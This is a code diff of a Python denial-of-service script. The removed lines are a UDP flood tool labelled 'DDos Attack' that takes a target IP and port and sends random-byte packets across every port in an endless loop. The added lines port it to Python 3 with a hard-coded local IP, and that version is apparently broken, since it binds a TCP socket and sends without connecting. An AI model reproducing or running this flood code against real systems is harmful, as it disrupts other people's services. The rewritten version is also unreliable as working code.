@@ -1,51 +1,47 @@
-import sys
-import os
-import time
-import socket
-import random
-#Code Time
+# import datetime
 from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+import os
+from random import randint
+import socket
+import sys
+import time
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+def get_current_date_time() -> str:
+    now: datetime = datetime.now()
+    return now.strftime("%d/%m/%Y %H:%M:%S")
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
-sent = 0
+# ip = input("IP Target : ")
+# port = input("Port: ")
+
+ip = '192.168.42.130'
+try:
+     port = int('80')
+except ValueError:
+     print('Invalid value')
+     sys.exit(1)
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind((ip, port))
+# sock.listen(1)
+
+for i in range(5):
+     print('[', end='')
+     for j in range(i*4):
+          print('=', end='')
+     for k in range(16-i*4):
+          print(' ', end='')
+     print(f'] {i * 25}%')
+     time.sleep(1)
+
+sent: int = 0
+print('Started at ', get_current_date_time())
 while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     # bytes_to_send: str = str(randint(1, 1490))
+     sock.send(b'1')
+     sent += 1
+     port += 1
+     print(f"Sent {sent} packet to {ip} throught port:{port}")
      if port == 65534:
        port = 1
-
+print('Finished at ', get_current_date_time())
